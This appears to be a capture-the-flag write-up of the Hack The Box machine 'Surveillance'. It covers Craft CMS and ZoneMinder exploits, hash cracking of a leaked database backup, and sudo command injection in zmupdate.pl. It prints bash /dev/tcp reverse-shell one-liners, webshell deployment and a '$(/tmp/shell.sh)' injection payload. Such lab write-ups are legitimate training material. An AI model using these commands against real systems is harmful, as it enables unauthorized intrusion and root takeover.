


# Initial Enumeration

## Port Scanning

### Full Port scan

As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.

```
nmap 10.129.230.42
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-19 12:45 CST
Nmap scan report for 10.129.230.42
Host is up (0.0100s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

```

### Detailed port scan

At the gedatialized port scan go to get more information from the services who are open on the ip address.

```
nmap -p22,80 -sCV 10.129.230.42 -vvvv
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-19 12:46 CST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:46
Completed NSE at 12:46, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:46
Completed NSE at 12:46, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:46
Completed NSE at 12:46, 0.00s elapsed
Initiating Ping Scan at 12:46
Scanning 10.129.230.42 [4 ports]
Completed Ping Scan at 12:46, 0.03s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:46
Completed Parallel DNS resolution of 1 host. at 12:46, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 12:46
Scanning 10.129.230.42 [2 ports]
Discovered open port 80/tcp on 10.129.230.42
Discovered open port 22/tcp on 10.129.230.42
Completed SYN Stealth Scan at 12:46, 0.02s elapsed (2 total ports)
Initiating Service scan at 12:46
Scanning 2 services on 10.129.230.42
Completed Service scan at 12:46, 8.54s elapsed (2 services on 1 host)
NSE: Script scanning 10.129.230.42.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:46
Completed NSE at 12:46, 0.52s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:46
Completed NSE at 12:46, 0.06s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:46
Completed NSE at 12:46, 0.00s elapsed
Nmap scan report for 10.129.230.42
Host is up, received echo-reply ttl 63 (0.0090s latency).
Scanned at 2025-02-19 12:46:04 CST for 10s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN+/g3FqMmVlkT3XCSMH/JtvGJDW3+PBxqJ+pURQey6GMjs7abbrEOCcVugczanWj1WNU5jsaYzlkCEZHlsHLvk=
|   256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIm6HJTYy2teiiP6uZoSCHhsWHN+z3SVL/21fy6cZWZi
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://surveillance.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:46
Completed NSE at 12:46, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:46
Completed NSE at 12:46, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:46
Completed NSE at 12:46, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.49 seconds
           Raw packets sent: 6 (240B) | Rcvd: 3 (116B)

```

i have added the FQDN to the hosts file, once that was done did i go to the webpage "http://surveillance.htb".

![[Pasted image 20250219195609.png]]
From there i scrolled down and i saw that the webpage is powered by cms. More specifically cms with the version 4.4.14. So now that i know that i will search an exploit for this version of cms.

![[Pasted image 20250219195807.png]]

By searching an exploit i have found the following CVE "CVE-2023-41892". This CVE is for an unauthenticated arbitrary object instantiation vulnerability in Craft CMS version 4.4.14 that can lead to remote code execution. There for i have founded the next exploit from github https://github.com/0xfalafel/CraftCMS_CVE-2023-41892. As you can see below did i deploy the exploit and did i get access to the webserver.

```
┌─[eu-dedivip-1]─[10.10.14.186]─[hackthekat123@htb-z8pwlkscxn]─[~/CraftCMS_CVE-2023-41892]
└──╼ [★]$ python3 craft-cms.py http://surveillance.htb
[+] Executing phpinfo to extract some config infos
temporary directory: /tmp
web server root: /var/www/html/craft/web
[+] create shell.php in /tmp
[+] trick imagick to move shell.php in /var/www/html/craft/web

[+] Webshell is deployed: http://surveillance.htb/shell.php?cmd=whoami
[+] Remember to delete shell.php in /var/www/html/craft/web when you're done

[!] Enjoy your shell

> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

> whoami
www-data
```

we gaan een bash commando gaan uitvoeren waarmee we via een listener connectie gaan krijgen met ssh connectie als user www-data

bash commando
```
bash -c 'bash -i >& /dev/tcp/10.10.14.186/8001 0>&1'
```

Listener

```
 nc -lvnp 8001
listening on [any] 8001 ...
connect to [10.10.14.186] from (UNKNOWN) [10.129.230.42] 56410
bash: cannot set terminal process group (999): Inappropriate ioctl for device
bash: no job control in this shell
www-data@surveillance:~/html/craft/web$
```

Within this connection, i have been searching after a backup file. I founded a backup file within the following path "/html/craft/storage/backups". After that i have started a listener and downloaded the backup file to my own machine. then i searched for usernames within this file.

```
cat surveillance--2023-10-17-202801--v4.4.14.sql | grep -ri "username"
surveillance--2023-10-17-202801--v4.4.14.sql:  `username` varchar(255) DEFAULT NULL,
surveillance--2023-10-17-202801--v4.4.14.sql:  KEY `idx_rpazcbmyerqfrnwzgiwbtgvfxurgowzhjzhm` (`username`),
surveillance--2023-10-17-202801--v4.4.14.sql:INSERT INTO `searchindex` VALUES (1,'email',0,1,' admin surveillance htb '),(1,'firstname',0,1,' matthew '),(1,'fullname',0,1,' matthew b '),(1,'lastname',0,1,' b '),(1,'slug',0,1,''),(1,'username',0,1,' admin '),(2,'slug',0,1,' home '),(2,'title',0,1,' home '),(7,'slug',0,1,' coming soon '),(7,'title',0,1,' coming soon ');
```

Then i did search on the username matthew, that i just founded within this sql file and there i founded a hash.

```
cat surveillance--2023-10-17-202801--v4.4.14.sql | grep -ri "matthew"
surveillance--2023-10-17-202801--v4.4.14.sql:INSERT INTO `searchindex` VALUES (1,'email',0,1,' admin surveillance htb '),(1,'firstname',0,1,' matthew '),(1,'fullname',0,1,' matthew b '),(1,'lastname',0,1,' b '),(1,'slug',0,1,''),(1,'username',0,1,' admin '),(2,'slug',0,1,' home '),(2,'title',0,1,' home '),(7,'slug',0,1,' coming soon '),(7,'title',0,1,' coming soon ');
surveillance--2023-10-17-202801--v4.4.14.sql:INSERT INTO `users` VALUES (1,NULL,1,0,0,0,1,'admin','Matthew B','Matthew','B','admin@surveillance.htb','39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec','2023-10-17 20:22:34',NULL,NULL,NULL,'2023-10-11 18:58:57',NULL,1,NULL,NULL,NULL,0,'2023-10-17 20:27:46','2023-10-11 17:57:16','2023-10-17 20:27:46');
```

I will set this hash into a hash file and i will try to crack the hash with john.

```
john --format=Raw-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA256 [SHA256 256/256 AVX2 8x])
Warning: poor OpenMP scalability for this hash type, consider --fork=4
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
starcraft122490  (?)     
1g 0:00:00:00 DONE (2025-02-19 13:37) 4.166g/s 15018Kp/s 15018Kc/s 15018KC/s stefon23..sozardme
Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
Session completed.
```

so now that i know the user and the password can i go login on the ssh server to get the user.txt flag.

`User flag = e7232c400716e03f10d891243a66966f`

```
ssh matthew@surveillance.htb
The authenticity of host 'surveillance.htb (10.129.230.42)' can't be established.
ED25519 key fingerprint is SHA256:Q8HdGZ3q/X62r8EukPF0ARSaCd+8gEhEJ10xotOsBBE.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'surveillance.htb' (ED25519) to the list of known hosts.
matthew@surveillance.htb's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-89-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Feb 19 07:39:04 PM UTC 2025

  System load:  0.15283203125     Processes:             239
  Usage of /:   70.5% of 5.91GB   Users logged in:       0
  Memory usage: 14%               IPv4 address for eth0: 10.129.230.42
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

matthew@surveillance:~$ cat user.txt 
e7232c400716e03f10d891243a66966f
```

Then i saw with the netstat -ant command that there is a localhost running on port 8080. So now i started a new ssh connection but now im doiing it with port forwarding.

```
ssh matthew@surveillance.htb -L 8080:127.0.0.1:8080
```

i did go to the webpage that i just forwarded on port 8080

![[Pasted image 20250219204521.png]]

searched in the ssh connection if i could not find any versions of what version of zoneminder is running on surveillance.

```
matthew@surveillance:/usr/share/zoneminder/www/api/app/Config$ cat * | grep -i version
cat: Schema: Is a directory
Configure::write('ZM_VERSION', '1.36.32');
Configure::write('ZM_API_VERSION', '1.36.32.1');
 * for instance. Each version can then have its own view cache namespace.
 *    value to false, when dealing with older versions of IE, Chrome Frame or certain web-browsing devices and AJAX
 * for instance. Each version can then have its own view cache namespace.
 *    value to false, when dealing with older versions of IE, Chrome Frame or certain web-browsing devices and AJAX
```

So now i searched after a exploit for the zoneminder that is running on the version 1.36.32 and there i founded the following CVE "CVE-2023-26035". I used the following exploit to get an rev shell as the user zoneminder on the ssh server. https://github.com/rvizx/CVE-2023-26035?tab=readme-ov-file

```
python3 exploit.py -t http://127.0.0.1:8080/ -ip 10.10.14.186 -p 4444
[>] fetching csrf token
[>] recieved the token: key:f21883e302e104f92141168ab64fe33c278e6faa,1739995065
[>] executing...
[>] sending payload..
[!] failed to send payload
```

listener

```
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.186] from (UNKNOWN) [10.129.230.42] 47712
bash: cannot set terminal process group (999): Inappropriate ioctl for device
bash: no job control in this shell
zoneminder@surveillance:/usr/share/zoneminder/www$ ls
```

I tried to see if we cannot use the sudo -l command to see if i cannot misbruik a path as the sudo user where i do not needed a password for, and Yes we can use it.

```
zoneminder@surveillance:/usr/share/zoneminder/www$ sudo -l
sudo -l
Matching Defaults entries for zoneminder on surveillance:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User zoneminder may run the following commands on surveillance:
    (ALL : ALL) NOPASSWD: /usr/bin/zm[a-zA-Z]*.pl *
```

then founded the following exploit

```
sudo /usr/bin/zmupdate.pl --version=1 --user='$(/tmp/shell.sh)' --pass=ZoneMinderPassword2023
```

The password i used here is the password i founded by using linpeas.
Also needed to make a shell.sh file to get the shell by the listener.
```
echo 'bash -i >& /dev/tcp/10.10.14.186/4444 0>&1' >> /tmp/shell.sh
```
then needed to start a listener and i had a connection to the root dir.

root flag = d533296b8a7a0501680241b06241aee2

```
 nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.186] from (UNKNOWN) [10.129.230.42] 51144
bash: cannot set terminal process group (999): Inappropriate ioctl for device
bash: no job control in this shell
root@surveillance:/usr/bin# cd ..
cd ..
root@surveillance:/usr# cd ..
cd ..
root@surveillance:/# ks
ks
ks: command not found
root@surveillance:/# ls
ls
bin
boot
dev
etc
home
lib
lib32
lib64
libx32
lost+found
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
root@surveillance:/# cd home	
cd home/
root@surveillance:/home# ls
ls
matthew
zoneminder
root@surveillance:/home# cd zone 
cd zoneminder/
root@surveillance:/home/zoneminder# ls
ls
root@surveillance:/home/zoneminder# cd ..
cd ..
root@surveillance:/home# cd ..
cd ..
root@surveillance:/# cd ..
cd ..
root@surveillance:/# ls
ls
bin
boot
dev
etc
home
lib
lib32
lib64
libx32
lost+found
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
root@surveillance:/# cd root
cd root
root@surveillance:~# ls
ls
root.txt
root@surveillance:~# cat root.txt
cat root.txt
d533296b8a7a0501680241b06241aee2
```

ROOTED

![[Pasted image 20250219213310.png]]